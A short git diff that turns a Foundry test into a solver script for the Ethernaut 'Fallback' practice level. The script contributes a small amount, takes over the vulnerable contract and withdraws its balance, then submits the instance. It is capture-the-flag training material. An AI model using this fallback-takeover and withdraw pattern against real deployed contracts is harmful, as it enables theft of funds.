@@ -7,8 +7,13 @@ import "forge-std/Test.sol";
 import "../utils/Ethernaut.sol";
 import "./Fallback.sol";
 
-contract FallbackTest is Test, Ethernaut {
-    function testFallback() public broadcasted {
+contract FallbackSolver is Test, Ethernaut {
+    function run() public {
+        IS_TEST = false;
+        test();
+    }
+
+    function test() public broadcasted {
         Fallback instance = Fallback(getLevelInstance(Levels.fallback_));
 
         instance.contribute{ value: 1 }();
@@ -16,5 +21,7 @@ contract FallbackTest is Test, Ethernaut {
         instance.withdraw();
 
         require(validateLevelInstance(Levels.fallback_, address(instance)), "no validation");
+
+        if (!IS_TEST) submitLevelInstance(address(instance));
     }
 }
